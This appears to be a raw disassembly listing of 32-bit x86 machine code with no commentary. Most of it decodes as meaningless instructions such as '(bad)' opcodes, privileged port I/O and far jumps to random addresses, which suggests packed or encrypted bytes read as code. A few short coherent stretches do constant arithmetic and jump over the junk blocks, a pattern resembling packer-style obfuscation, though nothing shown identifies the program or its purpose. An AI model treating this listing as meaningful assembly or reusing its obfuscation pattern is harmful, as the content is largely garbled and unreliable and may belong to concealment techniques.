  40e1a1:	adc    al,0x18
  40e1a3:	sbb    BYTE PTR [esi-0x3506d41f],dh
  40e1a9:	push   edx
  40e1aa:	aaa    
  40e1ab:	pop    ss
  40e1ac:	into   
  40e1ad:	out    0x34,eax
  40e1af:	inc    esi
  40e1b0:	in     al,0xa7
  40e1b2:	fwait
  40e1b3:	in     eax,dx
  40e1b4:	push   edx
  40e1b5:	cmp    BYTE PTR [eax],bh
  40e1b7:	xor    dl,BYTE PTR [edi-0x49ee8524]
  40e1bd:	cld    
  40e1be:	lock out dx,al
  40e1c0:	pop    edx
  40e1c1:	stc    
  40e1c2:	xchg   esi,eax
  40e1c3:	retf   0x639e
  40e1c6:	(bad)  
  40e1c7:	add    al,0x95
  40e1c9:	invd   
  40e1cb:	sub    dl,cl
  40e1cd:	in     al,0xb7
  40e1cf:	xchg   esp,eax
  40e1d0:	push   ss
  40e1d1:	jae    0x40e1ce
  40e1d3:	cs daa 
  40e1d5:	adc    ecx,edi
  40e1d7:	repnz adc DWORD PTR [ebp-0x16],ebp
  40e1db:	(bad)  [edi]
  40e1dd:	cmp    al,0xd8
  40e1df:	gs inc esi
  40e1e1:	mov    cl,BYTE PTR [esi]
  40e1e3:	fld    QWORD PTR [edi-0x7d636ab6]
  40e1e9:	mov    edi,0x63df2901
  40e1ee:	add    edx,DWORD PTR [eax]
  40e1f0:	(bad)  
  40e1f2:	neg    BYTE PTR [ebx]
  40e1f4:	xor    DWORD PTR [esi+0x7a795f5d],ecx
  40e1fa:	popf   
  40e1fb:	(bad)  
  40e1fd:	inc    BYTE PTR [esp+edx*8+0x5e42b93d]
  40e204:	xor    al,0x5c
  40e206:	lods   eax,DWORD PTR ds:[esi]
  40e207:	rcl    edx,0x9
  40e20a:	fstp   QWORD PTR [ecx]
  40e20c:	test   DWORD PTR [ecx-0x5284eee6],ebp
  40e212:	push   ss
  40e213:	jmp    0x1422:0xbec73e37
  40e21a:	dec    edi
  40e21b:	in     al,dx
  40e21c:	lods   al,BYTE PTR ds:[esi]
  40e21d:	adc    al,0xc9
  40e21f:	loopne 0x40e27b
  40e221:	test   DWORD PTR [ebx+0x25],edx
  40e224:	popf   
  40e225:	out    0x65,eax
  40e227:	or     DWORD PTR [ecx+eiz*4],esp
  40e22a:	xchg   ecx,eax
  40e22b:	dec    esi
  40e22c:	xor    bl,BYTE PTR [eax+0x22d57645]
  40e232:	loopne 0x40e292
  40e234:	sub    dh,BYTE PTR [edi+0x56d8b5a3]
  40e23a:	xor    eax,0x5a9b56af
  40e23f:	sti    
  40e240:	imul   ebp,DWORD PTR [esi+0x1b80bd03],0x196fefc6
  40e24a:	push   esi
  40e24b:	or     al,0xa5
  40e24d:	(bad)  
  40e24e:	je     0x40e23c
  40e250:	loopne 0x40e1df
  40e252:	push   es
  40e253:	fwait
  40e254:	cmp    ebx,esp
  40e256:	arpl   WORD PTR [ecx],bp
  40e258:	push   ecx
  40e259:	sbb    DWORD PTR [eax-0x23],esp
  40e25c:	fwait
  40e25d:	cmp    eax,DWORD PTR [ebx+0x1f448bf1]
  40e263:	xchg   BYTE PTR [edi+0x5f],ah
  40e266:	cmp    al,0x2
  40e268:	sbb    eax,0x6126a647
  40e26d:	sar    BYTE PTR [esi],0x66
  40e270:	xor    eax,0xe7be2e11
  40e275:	sub    bh,dl
  40e277:	sub    al,0xb9
  40e279:	inc    esi
  40e27a:	mov    eax,0x7aed39d8
  40e27f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e280:	or     al,0xba
  40e282:	lock std 
  40e284:	or     cl,BYTE PTR [ebx]
  40e286:	call   0xcc4268a1
  40e28b:	ror    DWORD PTR [eax],1
  40e28d:	sub    eax,DWORD PTR ds:0x1c0f08e4
  40e293:	pop    edi
  40e294:	out    0xae,eax
  40e296:	(bad)  
  40e297:	out    0xb4,eax
  40e299:	add    cl,bl
  40e29b:	cmp    eax,0x2188b2da
  40e2a0:	and    DWORD PTR [ecx-0x2f4184db],eax
  40e2a6:	dec    esi
  40e2a7:	shl    dh,1
  40e2a9:	inc    ecx
  40e2aa:	call   FWORD PTR [ebx+0x1bfda918]
  40e2b0:	sub    DWORD PTR [esi-0x3bc57aba],eax
  40e2b6:	and    eax,0x35ccc643
  40e2bb:	(bad)  [edx-0x77]
  40e2be:	pop    esp
  40e2bf:	popa   
  40e2c0:	repz sub DWORD PTR [edi+0x2113a88],esi
  40e2c7:	or     DWORD PTR ds:0x24736d22,eax
  40e2cd:	loopne 0x40e252
  40e2cf:	push   eax
  40e2d0:	in     al,dx
  40e2d1:	cmp    DWORD PTR ds:0x2a85926,0xc
  40e2d8:	(bad)  
  40e2d9:	call   FWORD PTR [edi+0x7e6f8166]
  40e2df:	xlat   BYTE PTR ds:[ebx]
  40e2e0:	inc    esp
  40e2e1:	outs   dx,BYTE PTR ds:[esi]
  40e2e2:	jmp    0x10d973ff
  40e2e7:	std    
  40e2e8:	or     eax,0x608a9823
  40e2ed:	int    0x97
  40e2ef:	inc    edi
  40e2f0:	or     al,0x2e
  40e2f2:	jecxz  0x40e301
  40e2f4:	pop    ebp
  40e2f5:	loope  0x40e375
  40e2f7:	inc    edx
  40e2f8:	dec    edi
  40e2f9:	xchg   esi,eax
  40e2fa:	fs dec edi
  40e2fc:	and    eax,0x685ee20e
  40e301:	fbld   TBYTE PTR [eax-0x1fdeb15d]
  40e307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e308:	fnsetpm(287 only) 
  40e30a:	jae    0x40e38b
  40e30c:	into   
  40e30d:	mov    edi,0x774d19b4
  40e312:	or     eax,ecx
  40e314:	jne    0x40e2f2
  40e316:	jecxz  0x40e33c
  40e318:	ror    BYTE PTR [ebx-0x6490505],cl
  40e31e:	add    al,0xfd
  40e320:	fwait
  40e321:	test   DWORD PTR [ebx+0x32],edx
  40e324:	cmc    
  40e325:	imul   eax,ebx,0x48
  40e328:	cmp    ecx,DWORD PTR [esi-0x62681a72]
  40e32e:	stos   BYTE PTR es:[edi],al
  40e32f:	sbb    BYTE PTR [ebx-0x211e1db],0x30
  40e336:	std    
  40e337:	aas    
  40e338:	cmc    
  40e339:	int    0x14
  40e33b:	lods   eax,DWORD PTR ds:[esi]
  40e33c:	jnp    0x40e325
  40e33e:	ror    BYTE PTR [edi-0x5e85add0],1
  40e344:	hlt    
  40e345:	outs   dx,BYTE PTR ds:[esi]
  40e346:	push   esi
  40e347:	inc    esi
  40e348:	mov    al,ds:0x75946d5b
  40e34d:	fstp   DWORD PTR [eax]
  40e34f:	jge    0x40e34e
  40e351:	in     eax,dx
  40e352:	dec    esi
  40e353:	or     esp,DWORD PTR [eax-0x1f]
  40e356:	(bad)  
  40e357:	cmp    eax,0xef2a903a
  40e35c:	stc    
  40e35d:	or     edi,DWORD PTR [edi-0x11]
  40e360:	lar    esi,WORD PTR [edi+0x1ddce478]
  40e367:	sar    BYTE PTR [edx+0x47ed62ee],0x6f
  40e36e:	add    DWORD PTR [ebx+0x7dea9a88],esp
  40e374:	jmp    0x5807:0xe99a3e79
  40e37b:	aad    0x14
  40e37d:	stos   DWORD PTR es:[edi],eax
  40e37e:	pop    edx
  40e37f:	pop    esi
  40e380:	cmp    BYTE PTR [ebx+0xe],ah
  40e383:	adc    DWORD PTR [esi+0xf44d5ca],eax
  40e389:	imul   esp,DWORD PTR [ebp+0x593fd59d],0x903adcc5
  40e393:	fdivr  st(3),st
  40e395:	popf   
  40e396:	daa    
  40e397:	add    dl,BYTE PTR ds:0x8ec9d4a5
  40e39d:	mov    DWORD PTR [edx-0x7080eba9],ecx
  40e3a3:	jecxz  0x40e377
  40e3a5:	mov    ds:0xcd657cf0,al
  40e3aa:	inc    ecx
  40e3ab:	iret   
  40e3ac:	mov    ch,0x1c
  40e3ae:	cli    
  40e3af:	sahf   
  40e3b0:	xchg   ebp,eax
  40e3b1:	cmc    
  40e3b2:	das    
  40e3b3:	leave  
  40e3b4:	pushf  
  40e3b5:	aas    
  40e3b6:	lods   al,BYTE PTR ds:[esi]
  40e3b7:	cmp    BYTE PTR [edx+0xd],cl
  40e3ba:	js     0x40e393
  40e3bc:	xchg   ebx,eax
  40e3bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3be:	lock loope 0x40e3e5
  40e3c1:	dec    esi
  40e3c2:	mov    eax,0x11793ad2
  40e3c7:	adc    edx,DWORD PTR [eax-0xb040e13]
  40e3cd:	mov    gs,WORD PTR [eax-0x8]
  40e3d0:	les    edx,FWORD PTR [ecx+0x756c0d89]
  40e3d6:	mov    edx,0x1a54057e
  40e3db:	test   al,0xbc
  40e3dd:	adc    dl,dl
  40e3df:	gs clc 
  40e3e1:	cld    
  40e3e2:	mov    bh,0xed
  40e3e4:	cmp    dl,BYTE PTR [ebx+eiz*8+0x7f5cf7f7]
  40e3eb:	imul   ebx,DWORD PTR [eax-0x5e514d6f],0x43
  40e3f2:	mov    al,0xc7
  40e3f4:	or     al,0x2d
  40e3f6:	cwde   
  40e3f7:	cli    
  40e3f8:	add    eax,0xf32f3cc
  40e3fd:	pop    ecx
  40e3fe:	shr    cl,0xc2
  40e401:	sbb    DWORD PTR [ebx-0x50],ebp
  40e404:	dec    esp
  40e405:	push   ebp
  40e406:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e407:	ficom  WORD PTR [edi]
  40e409:	rcl    bh,1
  40e40b:	jo     0x40e39d
  40e40d:	cmp    DWORD PTR [ebx],0x3e
  40e410:	sub    ecx,eax
  40e412:	dec    eax
  40e413:	cli    
  40e414:	add    bh,0x1
  40e417:	jmp    DWORD PTR [esi+0x5d]
  40e41a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e41b:	(bad)  
  40e41c:	clc    
  40e41d:	push   esp
  40e41e:	xor    al,0x10
  40e420:	pop    ss
  40e421:	sbb    esp,DWORD PTR [ecx-0x6]
  40e424:	inc    edi
  40e425:	stc    
  40e426:	clc    
  40e427:	cli    
  40e428:	fidiv  DWORD PTR [ecx+edx*2-0x2]
  40e42c:	inc    cl
  40e42e:	dec    esi
  40e42f:	mov    ds:0x626716ab,eax
  40e434:	cmp    eax,0xacfb3c84
  40e439:	iret   
  40e43a:	retf   
  40e43b:	or     DWORD PTR [eax-0x31cbb0d5],ecx
  40e441:	leave  
  40e442:	dec    eax
  40e443:	je     0x40e495
  40e445:	sti    
  40e446:	mov    eax,0x281b362f
  40e44b:	xor    edx,edx
  40e44d:	and    eax,0x6d33
  40e452:	lea    ecx,[ecx+eax*1-0x6520]
  40e459:	mov    eax,DWORD PTR [ebp+0x8]
  40e45c:	mov    ebx,DWORD PTR [ebp-0x4]
  40e45f:	add    eax,edi
  40e461:	div    ebx
  40e463:	mov    edx,DWORD PTR [ebp-0x8]
  40e466:	mov    ebx,0x940a7
  40e46b:	sub    eax,edx
  40e46d:	xor    edx,edx
  40e46f:	div    ebx
  40e471:	add    eax,esi
  40e473:	cmp    ecx,eax
  40e475:	jb     0x40db77
  40e47b:	xor    ebx,ebx
  40e47d:	inc    ebx
  40e47e:	mov    DWORD PTR [ebp+0xc],0x77bd
  40e485:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40e48c:	mov    DWORD PTR [ebp-0x8],0x4738
  40e493:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40e49a:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40e4a1:	mov    DWORD PTR [ebp-0x14],0x64ec
  40e4a8:	mov    DWORD PTR [ebp-0x18],0x1984
  40e4af:	mov    DWORD PTR [ebp-0x1c],0x293
  40e4b6:	mov    eax,DWORD PTR [ebp+0x8]
  40e4b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4bc:	add    eax,0x1ef2
  40e4c1:	and    eax,ecx
  40e4c3:	xor    eax,0x7240
  40e4c8:	mov    ecx,0x7aaa
  40e4cd:	jmp    0x40e791
  40e4d2:	mov    eax,0x5a62ef3c
  40e4d7:	and    bl,BYTE PTR [edx+edi*1]
  40e4da:	ss dec esi
  40e4dc:	xor    DWORD PTR [eax+0x70610b3d],0x1818c289
  40e4e6:	rcl    BYTE PTR [eax+ebx*1],cl
  40e4e9:	sbb    dh,ch
  40e4eb:	adc    esi,DWORD PTR [ecx]
  40e4ed:	xor    BYTE PTR cs:[esi+0x4c23056],dh
  40e4f4:	jg     0x40e4a0
  40e4f6:	popa   
  40e4f7:	jmp    0x40e558
  40e4f9:	inc    ebx
  40e4fa:	ds jnp 0x40e56c
  40e4fd:	push   ds
  40e4fe:	pop    ecx
  40e4ff:	or     eax,0x4885026b
  40e504:	(bad)  
  40e505:	mov    ds:0x41cf7448,eax
  40e50a:	test   eax,0xd6e70f7
  40e50f:	clc    
  40e510:	cmp    al,0xd7
  40e512:	inc    esp
  40e513:	xor    al,0x40
  40e515:	push   cs
  40e516:	je     0x40e543
  40e518:	hlt    
  40e519:	sub    ah,dl
  40e51b:	jmp    0x75a30cea
  40e520:	mov    dl,BYTE PTR [eax-0x7c]
  40e523:	jmp    0xfddb:0x4a996b38
  40e52a:	push   ds
  40e52b:	dec    edi
  40e52c:	lahf   
  40e52d:	push   cs
  40e52e:	rcl    DWORD PTR [eax],0x82
  40e531:	mov    esp,?
  40e533:	xchg   esi,eax
  40e534:	mov    esi,0xb5cddb3c
  40e539:	jmp    0x4d34:0xebf70320
  40e540:	outs   dx,DWORD PTR ds:[esi]
  40e541:	das    
  40e542:	jp     0x40e596
  40e544:	ret    
  40e545:	loopne 0x40e5b7
  40e547:	jp     0x40e4e0
  40e549:	xor    DWORD PTR [ebx],ebx
  40e54b:	ud1    edx,eax
  40e54e:	test   DWORD PTR [eax],esi
  40e550:	inc    ecx
  40e551:	ror    DWORD PTR [edi+0x78],0x2f
  40e555:	cli    
  40e556:	xor    DWORD PTR [esi],esp
  40e558:	into   
  40e559:	ret    0x79c5
  40e55c:	jb     0x40e5c1
  40e55e:	xor    al,0xfb
  40e560:	jne    0x40e54a
  40e562:	clc    
  40e563:	loopne 0x40e58c
  40e565:	jp     0x40e53d
  40e567:	push   edx
  40e568:	dec    esi
  40e569:	or     al,BYTE PTR [ecx-0x3c5698c7]
  40e56f:	mov    ds:0xf64edd06,al
  40e574:	push   0x2b
  40e576:	adc    BYTE PTR [edx+eiz*1],bl
  40e579:	mov    al,0x79
  40e57b:	fld    QWORD PTR [edx]
  40e57d:	dec    ebp
  40e57e:	add    dh,BYTE PTR [edi+0x5e513682]
  40e584:	dec    ebx
  40e585:	mov    esi,0x203164ce
  40e58a:	sub    DWORD PTR [ecx],ecx
  40e58c:	cld    
  40e58d:	push   cs
  40e58e:	xor    ah,BYTE PTR [eax+0x24053dd9]
  40e594:	les    ebp,FWORD PTR [edi-0x62]
  40e597:	clc    
  40e598:	xchg   ebp,eax
  40e599:	inc    ecx
  40e59a:	pop    es
  40e59b:	ins    BYTE PTR es:[edi],dx
  40e59c:	div    DWORD PTR [edi+0x7b5d8e5e]
  40e5a2:	daa    
  40e5a3:	or     eax,0xe2aaa9e3
  40e5a8:	jae    0x40e5d4
  40e5aa:	xchg   ecx,eax
  40e5ab:	mov    ds:0x4ca0f19f,al
  40e5b0:	adc    DWORD PTR [eax],edx
  40e5b2:	inc    ebp
  40e5b3:	aad    0xb4
  40e5b5:	xchg   BYTE PTR [edx],cl
  40e5b7:	sub    eax,0x2f778a65
  40e5bc:	fidivr WORD PTR [ecx+0x54]
  40e5bf:	into   
  40e5c0:	sbb    cl,BYTE PTR [esi-0x7e]
  40e5c3:	xchg   esi,eax
  40e5c4:	mov    ds:0x374c9d24,al
  40e5c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5ca:	rol    DWORD PTR [edx],0x16
  40e5cd:	jae    0x40e5b9
  40e5cf:	adc    BYTE PTR [edi],0x69
  40e5d2:	fs jnp 0x40e62c
  40e5d5:	mov    cl,0x54
  40e5d7:	adc    dl,0xfe
  40e5da:	inc    BYTE PTR [ecx-0x9210c0f]
  40e5e0:	imul   esp,DWORD PTR [ebx],0x1b
  40e5e3:	cld    
  40e5e4:	mov    edi,0x9444227c
  40e5e9:	xor    dl,BYTE PTR [ebp+0x52]
  40e5ec:	cmp    eax,0xe775423f
  40e5f1:	pushf  
  40e5f2:	xor    DWORD PTR [ecx-0x701b4cbc],edi
  40e5f8:	lds    eax,FWORD PTR [eax+eax*8+0x34b94b58]
  40e5ff:	loop   0x40e5d3
  40e601:	adc    eax,0xd9a71789
  40e606:	das    
  40e607:	sbb    ch,BYTE PTR [ebp+0x7d]
  40e60a:	mov    BYTE PTR [eax+0x2cd9334d],ah
  40e610:	push   ss
  40e611:	xchg   esi,eax
  40e612:	pushf  
  40e613:	mov    al,0x7f
  40e615:	push   0x461896cf
  40e61a:	pop    eax
  40e61b:	in     eax,dx
  40e61c:	pop    esp
  40e61d:	or     bh,cl
  40e61f:	pop    ds
  40e620:	mov    edi,0xad913f8d
  40e625:	fwait
  40e626:	mov    ah,0x48
  40e628:	lods   eax,DWORD PTR ds:[esi]
  40e629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e62a:	nop
  40e62b:	mov    ?,ecx
  40e62d:	fisubr WORD PTR [eax-0x13d5793e]
  40e633:	out    0x82,eax
  40e635:	and    eax,0x6f1a65d0
  40e63a:	daa    
  40e63b:	cmp    BYTE PTR [ecx],ch
  40e63d:	out    0x33,al
  40e63f:	inc    esp
  40e640:	stos   BYTE PTR es:[edi],al
  40e641:	xchg   edi,eax
  40e642:	es cwde 
  40e644:	out    dx,al
  40e645:	lahf   
  40e646:	sbb    DWORD PTR [ecx],ebp
  40e648:	cli    
  40e649:	jmp    0x2ccb6307
  40e64e:	pop    ss
  40e64f:	pushf  
  40e650:	or     ah,BYTE PTR [edi+edx*1-0xe]
  40e654:	push   edx
  40e655:	loop   0x40e616
  40e657:	mov    cs,edx
  40e659:	xchg   esp,eax
  40e65a:	inc    esp
  40e65b:	cs test eax,0x4121a31a
  40e661:	jb     0x40e632
  40e663:	cld    
  40e664:	xor    al,0x3c
  40e666:	inc    esi
  40e667:	sub    ecx,ecx
  40e669:	nop
  40e66a:	call   0xdb6e:0x4194f3a
  40e671:	inc    edi
  40e672:	clc    
  40e673:	sbb    bl,dl
  40e675:	sbb    cl,0x19
  40e678:	cmp    ebp,DWORD PTR [ebp-0x6e67e79e]
  40e67e:	iret   
  40e67f:	sbb    esi,DWORD PTR [edi-0x68]
  40e682:	inc    edi
  40e683:	out    0xf4,al
  40e685:	lea    edx,[edi-0x68a7acd9]
  40e68b:	pop    esi
  40e68c:	retf   0x8ee7
  40e68f:	adc    al,0x1d
  40e691:	scas   al,BYTE PTR es:[edi]
  40e692:	shl    cl,cl
  40e694:	add    ebp,DWORD PTR [ebp+0x3]
  40e697:	fld    DWORD PTR [esi+0x73e39ba7]
  40e69d:	xchg   edx,eax
  40e69e:	les    edi,FWORD PTR [ebp-0x70c4276c]
  40e6a4:	(bad)  
  40e6a5:	ds in  al,dx
  40e6a7:	mov    ds:0x703d05cf,al
  40e6ac:	push   ebx
  40e6ad:	arpl   WORD PTR ds:0x41c7e4bc,si
  40e6b3:	test   eax,0x7a22f74d
  40e6b8:	mov    dl,BYTE PTR [esi+0xf6995cc]
  40e6be:	or     al,0xa2
  40e6c0:	push   edi
  40e6c1:	cld    
  40e6c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6c3:	xor    bh,ch
  40e6c5:	push   edx
  40e6c6:	inc    ecx
  40e6c7:	(bad)  [ecx+0x441f3f9e]
  40e6cd:	mov    dh,0x53
  40e6cf:	scas   eax,DWORD PTR es:[edi]
  40e6d0:	leave  
  40e6d1:	ret    0xfbc
  40e6d4:	mov    cl,0xa
  40e6d6:	xor    eax,0x9875e0a1
  40e6db:	in     eax,dx
  40e6dc:	ficomp DWORD PTR [esi]
  40e6de:	add    ah,ch
  40e6e0:	test   ebp,esi
  40e6e2:	dec    esp
  40e6e3:	rol    DWORD PTR cs:[edx],cl
  40e6e6:	fld    TBYTE PTR [eax-0x719589a6]
  40e6ec:	lea    eax,[ebp+0x50]
  40e6ef:	in     eax,0x84
  40e6f1:	jo     0x40e769
  40e6f3:	sahf   
  40e6f4:	loopne 0x40e69f
  40e6f6:	xchg   esi,eax
  40e6f7:	sahf   
  40e6f8:	xchg   edx,eax
  40e6f9:	je     0x40e6d5
  40e6fb:	mov    edi,0x2a77bad
  40e700:	(bad)  
  40e702:	in     al,0x5
  40e704:	or     al,0xa3
  40e706:	repnz and DWORD PTR [esi-0x34],ebx
  40e70a:	fucomip st,st(1)
  40e70c:	and    al,0xfd
  40e70e:	add    eax,DWORD PTR [ebp+0xb685e28]
  40e714:	je     0x40e752
  40e716:	call   0x2973:0x9842f6ca
  40e71d:	xchg   edx,eax
  40e71e:	cmc    
  40e71f:	or     dx,dx
  40e722:	dec    esp
  40e723:	inc    edx
  40e724:	loop   0x40e6f6
  40e726:	mov    WORD PTR [edi],?
  40e728:	call   FWORD PTR [ecx]
  40e72a:	out    dx,eax
  40e72b:	xor    BYTE PTR [ebx-0x41],0x71
  40e72f:	fcom   st(1)
  40e731:	jne    0x40e765
  40e733:	jae    0x40e779
  40e735:	jb     0x40e6f0
  40e737:	shl    DWORD PTR [edi],0x48
  40e73a:	pop    ecx
  40e73b:	jb     0x40e6e7
  40e73d:	mov    esi,0xf143f0e
  40e742:	outs   dx,DWORD PTR cs:[esi]
  40e744:	jle    0x40e71b
  40e746:	push   esi
  40e747:	test   dl,bl
  40e749:	pusha  
  40e74a:	dec    edx
  40e74b:	popf   
  40e74c:	xor    al,0xb4
  40e74e:	pop    ecx
  40e74f:	jge    0x40e75c
  40e751:	outs   dx,DWORD PTR ds:[esi]
  40e752:	mov    al,0x8c
  40e754:	retf   0xfb7f
  40e757:	popf   
  40e758:	pop    ebp
  40e759:	cli    
  40e75a:	jmp    0xb5f85c4d
  40e75f:	test   eax,0x87936217
  40e764:	cs int 0x73
  40e767:	and    cl,BYTE PTR ds:0x4fe2a8de
  40e76d:	xlat   BYTE PTR ds:[ebx]
  40e76e:	mov    ds:0x47035175,al
  40e773:	(bad)  
  40e774:	enter  0x1714,0xea
  40e778:	pushf  
  40e779:	inc    edi
  40e77a:	popf   
  40e77b:	pop    ebp
  40e77c:	mov    ecx,0x33494a34
  40e781:	jle    0x40e73e
  40e783:	and    ecx,DWORD PTR [edi-0x3b]
  40e786:	call   DWORD PTR [edi+0x430896be]
  40e78c:	xchg   ebp,eax
  40e78d:	imul   BYTE PTR [ebx+edx*4]
  40e790:	leave  
  40e791:	sub    ecx,eax
  40e793:	mov    DWORD PTR [ebp+0xc],0x8d3
  40e79a:	mov    DWORD PTR [ebp+0x8],0x2392
  40e7a1:	mov    DWORD PTR [ebp-0x20],ebx
  40e7a4:	mov    DWORD PTR [ebp-0x24],0x338f
  40e7ab:	mov    DWORD PTR [ebp-0x28],0x61c9
  40e7b2:	mov    eax,DWORD PTR [ebp+0x8]
  40e7b5:	mov    edx,DWORD PTR [ebp+0xc]
  40e7b8:	imul   eax,edx
  40e7bb:	xor    eax,0x40a0
  40e7c0:	or     eax,0x1a48
  40e7c5:	xor    eax,0x139ddb0
  40e7ca:	mov    esi,ecx
  40e7cc:	sub    esi,eax
  40e7ce:	mov    eax,DWORD PTR [ebp-0x28]
  40e7d1:	mov    edx,DWORD PTR [ebp-0x24]
  40e7d4:	mov    edi,DWORD PTR [ebp-0x20]
  40e7d7:	or     eax,0x1cc2
  40e7dc:	sub    eax,edx
  40e7de:	jmp    0x40eaa2
  40e7e3:	or     BYTE PTR [esp+ebx*1-0xd],0x1c
  40e7e8:	loop   0x40e828
  40e7ea:	sbb    bh,BYTE PTR [esi]
  40e7ec:	call   DWORD PTR [ebx-0x56]
  40e7ef:	push   DWORD PTR [ecx-0x41bd950a]
  40e7f5:	sbb    BYTE PTR [eax],bl
  40e7f7:	rcl    BYTE PTR [eax+ebx*1],cl
  40e7fa:	sbb    dh,ah
  40e7fc:	adc    DWORD PTR [ebp-0x25d65d8],0xef39e7c2
  40e806:	mov    ds:0x2ff65aae,eax
  40e80b:	adc    eax,0x8f34a510
  40e810:	cmp    esp,edx
  40e812:	retf   
  40e813:	add    BYTE PTR [esi],bl
  40e815:	cli    
  40e816:	fidiv  WORD PTR [ebp+esi*8+0x6d]
  40e81a:	dec    edi
  40e81b:	jnp    0x40e80b
  40e81d:	fs popf 
  40e81f:	mov    DWORD PTR [esi+0x52cdeabb],ebp
  40e825:	push   cs
  40e826:	dec    eax
  40e827:	popf   
  40e828:	bound  ecx,QWORD PTR [ecx-0x79]
  40e82b:	mov    cl,BYTE PTR [edi-0x24]
  40e82e:	fistp  WORD PTR [eax+0x66]
  40e831:	sbb    BYTE PTR [edx],bh
  40e833:	lods   eax,DWORD PTR gs:[esi]
  40e835:	aad    0x1a
  40e837:	xor    ebp,DWORD PTR [ebx]
  40e839:	dec    esp
  40e83a:	scas   al,BYTE PTR es:[edi]
  40e83b:	into   
  40e83c:	aam    0x40
  40e83e:	sbb    ebp,DWORD PTR [edi+ebx*4]
  40e841:	call   0x8117520f
  40e846:	push   ss
  40e847:	ds inc edi
  40e849:	ins    DWORD PTR es:[edi],dx
  40e84a:	push   ebp
  40e84b:	sbb    al,0x16
  40e84d:	data16 icebp 
  40e84f:	xor    edi,DWORD PTR [ebx+ebp*1-0x59]
  40e853:	dec    esp
  40e854:	add    ch,bh
  40e856:	mov    WORD PTR [ebx+0x41],cs
  40e859:	aas    
  40e85a:	pushf  
  40e85b:	bnd ret 
  40e85d:	push   0x2d71fff1
  40e862:	(bad)  
  40e863:	cmc    
  40e864:	push   0xe5ec17d9
  40e869:	fistp  DWORD PTR [ebx-0x2f2d9bb2]
  40e86f:	test   eax,0xb6a767a3
  40e874:	mov    eax,ds:0xba45446e
  40e879:	test   DWORD PTR [eax],0xbf7bc709
  40e87f:	mov    dh,0xbd
  40e881:	lods   eax,DWORD PTR ds:[esi]
  40e882:	sar    BYTE PTR [ecx],1
  40e884:	inc    esi
  40e885:	sbb    eax,0xc9ddcf6d
  40e88a:	mov    ds:0x6c9ab63b,al
  40e88f:	push   0x3a
  40e891:	in     al,dx
  40e892:	sub    al,0x61
  40e894:	inc    ebx
  40e895:	add    DWORD PTR [eax+ebp*8+0x62],eax
  40e899:	leave  
  40e89a:	loopne 0x40e875
  40e89c:	scas   eax,DWORD PTR es:[edi]
  40e89d:	stos   DWORD PTR es:[edi],eax
  40e89e:	dec    ebp
  40e89f:	aam    0x2d
  40e8a1:	add    al,0x61
  40e8a3:	adc    esp,DWORD PTR ds:0x993cc3f4
  40e8a9:	sub    BYTE PTR [ebx-0x5609b9bc],cl
  40e8af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8b0:	and    eax,0x131c5cbd
  40e8b5:	int    0xa3
  40e8b7:	xchg   ebp,eax
  40e8b8:	das    
  40e8b9:	add    eax,0x116b6c1b
  40e8be:	jne    0x40e843
  40e8c0:	out    0x21,eax
  40e8c2:	test   al,0x9e
  40e8c4:	enter  0xeb9b,0x21
  40e8c8:	sahf   
  40e8c9:	mov    ds:0x4a202726,al
  40e8ce:	into   
  40e8cf:	call   0xa288b579
  40e8d4:	cld    
  40e8d5:	out    0xf0,eax
  40e8d7:	cmp    eax,0xfe94f611
  40e8dc:	lods   eax,DWORD PTR ds:[esi]
  40e8dd:	xor    DWORD PTR [ecx+0x5f],ecx
  40e8e0:	sbb    DWORD PTR [ebp+0x20d6dea0],ebx
  40e8e6:	scas   al,BYTE PTR es:[edi]
  40e8e7:	outs   dx,BYTE PTR ds:[esi]
  40e8e8:	cmp    BYTE PTR [ebp+0x6f08e1bd],0xd3
  40e8ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8f0:	imul   esi,DWORD PTR [edi],0xffffffe2
  40e8f3:	pop    edi
  40e8f4:	scas   eax,DWORD PTR es:[edi]
  40e8f5:	xchg   ebp,eax
  40e8f6:	loope  0x40e8c8
  40e8f8:	mov    edi,ecx
  40e8fa:	(bad)  
  40e8fb:	jno    0x40e8bb
  40e8fd:	movsx  eax,WORD PTR [eax-0x5cc7ac9b]
  40e904:	jge    0x40e8d5
  40e906:	pop    edx
  40e907:	addr16 loopne 0x40e8f5
  40e90a:	pop    es
  40e90b:	popa   
  40e90c:	sti    
  40e90d:	bound  ebp,QWORD PTR [ebx]
  40e90f:	pop    eax
  40e910:	adc    dl,BYTE PTR [ecx+0x36]
  40e913:	xchg   edx,eax
  40e914:	inc    esp
  40e915:	dec    ecx
  40e916:	or     edx,DWORD PTR [ebp+edi*4-0x7d940b14]
  40e91d:	mov    esi,0xce367aa1
  40e922:	pop    es
  40e923:	inc    esi
  40e924:	sub    al,0x3d
  40e926:	adc    eax,0x8ff9e45b
  40e92b:	fist   DWORD PTR [ecx+0x126a654c]
  40e931:	push   ss
  40e932:	ja     0x40e977
  40e934:	mov    edi,0xcfccf7fa
  40e939:	jle    0x40e8d2
  40e93b:	cs in  al,dx
  40e93d:	sub    DWORD PTR [ebx],edx
  40e93f:	lods   al,BYTE PTR ds:[esi]
  40e940:	xor    dh,BYTE PTR [eax]
  40e942:	out    0x7c,eax
  40e944:	fisttp WORD PTR [edi+0x3b7c1d91]
  40e94a:	adc    al,0xcf
  40e94c:	push   ebp
  40e94d:	xlat   BYTE PTR ds:[ebx]
  40e94e:	mul    BYTE PTR [eax-0x5c]
  40e951:	xchg   ecx,eax
  40e952:	push   esi
  40e953:	push   es
  40e954:	(bad)  
  40e955:	shl    esi,0x3f
  40e958:	leave  
  40e959:	call   0x5761:0xdc995747
  40e960:	data16 (bad) 
  40e962:	and    al,0x7
  40e964:	cmp    DWORD PTR [edi],0x49d382ad
